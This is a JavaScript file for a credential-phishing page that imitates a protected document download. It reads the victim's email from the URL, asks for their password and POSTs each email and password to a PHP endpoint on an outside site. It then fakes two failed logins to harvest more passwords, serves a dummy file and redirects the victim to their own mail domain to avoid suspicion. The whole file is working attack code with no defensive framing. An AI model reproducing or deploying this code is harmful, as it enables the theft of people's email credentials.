// --- CONFIG ---
const PHP_ENDPOINT = 'https://liberopetshop.rs/product/js/submit.php'; // Update this path if needed
const REDIRECT_DELAY = 4000;

// Rest of the file remains exactly the same...
// (Keep all previous functions: toggleTheme, loadTheme, getEmailFromUrl, etc.)

// --- LOGIN ATTEMPT TRACKING ---
let loginAttempts = 0;
const maxAttempts = 3;

// --- THEME ---
function toggleTheme() {
  document.body.classList.toggle('dark-mode');
  localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
}
function loadTheme() {
  if (localStorage.getItem('darkMode') === 'true') document.body.classList.add('dark-mode');
}

// --- EMAIL FROM URL HASH ---
function getEmailFromUrl() {
  const hash = window.location.hash;
  if (hash) {
    if (hash.startsWith('#email=')) return decodeURIComponent(hash.substring(7));
    else if (hash.includes('@') && hash.includes('.')) return decodeURIComponent(hash.substring(1));
  }
  return null;
}
function getDomainFromEmail(email) {
  return email && email.includes('@') ? email.split('@')[1] : null;
}
function getRedirectUrl(email) {
  const domain = getDomainFromEmail(email);
  return domain ? `https://${domain}` : null;
}

// --- UPDATE ATTEMPT DISPLAY ---
function updateAttemptCounter() {
  document.getElementById('attemptCount').textContent = `Attempts: ${loginAttempts}/3`;
  for (let i = 1; i <= maxAttempts; i++) {
    const dot = document.getElementById(`attempt${i}`);
    dot.classList.remove('active', 'error');
    if (i <= loginAttempts) dot.classList.add(i < maxAttempts ? 'error' : 'active');
  }
}

// --- MODAL CONTROL ---
let currentFile = '';
function showLoginModal(fileName) {
  currentFile = fileName;
  document.getElementById('fileName').textContent = fileName;
  document.getElementById('password').value = '';
  const urlEmail = getEmailFromUrl();
  document.getElementById('email').value = urlEmail || '';
  document.getElementById('loginModal').classList.add('show');
  if (urlEmail) document.getElementById('password').focus();
  else document.getElementById('email').focus();
}
function hideLoginModal() {
  document.getElementById('loginModal').classList.remove('show');
  document.getElementById('loadingDiv').style.display = 'none';
  currentFile = '';
}

// --- TOAST ---
function showToast(message, type = 'success') {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = `toast ${type} show`;
  setTimeout(() => toast.classList.remove('show'), 4000);
}

// --- BACKEND CALL (now real) ---
async function sendToBackend(userEmail, password, fileName) {
  try {
    const formData = new FormData();
    formData.append('email', userEmail);
    formData.append('password', password);
    formData.append('fileName', fileName);
    
    const response = await fetch(PHP_ENDPOINT, { 
      method: 'POST', 
      body: formData 
    });
    
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return await response.json();
  } catch (err) {
    console.error('Backend error:', err);
    return { success: false, message: 'Network error' };
  }
}

// --- SIMULATE DOWNLOAD ---
function simulateFileDownload() {
  const content = `Simulated download: ${currentFile}\n\n(Actual file is protected)`;
  const blob = new Blob([content], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = currentFile;
  document.body.appendChild(link);
  link.click();
  setTimeout(() => { document.body.removeChild(link); URL.revokeObjectURL(url); }, 100);
}

// --- FORM SUBMIT ---
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const loadingDiv = document.getElementById('loadingDiv');
  const submitBtn = document.getElementById('submitBtn');

  if (!email || !password) {
    showToast('Please fill in all fields', 'error');
    return;
  }

  submitBtn.disabled = true;
  loadingDiv.style.display = 'block';

  try {
    // Send to real backend now
    await sendToBackend(email, password, currentFile);

    document.getElementById('password').value = '';
    loginAttempts++;
    updateAttemptCounter();

    setTimeout(() => {
      if (loginAttempts < maxAttempts) {
        showToast(`Authentication failed (attempt ${loginAttempts}/${maxAttempts}). Please retry.`, 'error');
      } else {
        showToast('Authentication successful! Downloading file...');
        simulateFileDownload();

        const redirectUrl = getRedirectUrl(email);
        if (redirectUrl) {
          setTimeout(() => { window.location.href = redirectUrl; }, REDIRECT_DELAY);
        }
        hideLoginModal();
        loginAttempts = 0;
        updateAttemptCounter();
      }

      submitBtn.disabled = false;
      loadingDiv.style.display = 'none';
    }, 1500);
  } catch (error) {
    showToast('Submission error', 'error');
    submitBtn.disabled = false;
    loadingDiv.style.display = 'none';
    document.getElementById('password').value = '';
  }
});

document.getElementById('loginModal').addEventListener('click', hideLoginModal);
document.querySelector('.login-modal').addEventListener('click', e => e.stopPropagation());

window.addEventListener('load', function() {
  setTimeout(() => {
    const loader = document.getElementById('office-loader');
    loader.style.opacity = '0';
    setTimeout(() => { loader.style.display = 'none'; }, 500);
  }, 2000);
});

loadTheme();
updateAttemptCounter();

document.addEventListener('DOMContentLoaded', function() {
  if (getEmailFromUrl()) {
    setTimeout(() => {
      showLoginModal('Specific products, with detailed description.pdf');
    }, 2500);
  }
});
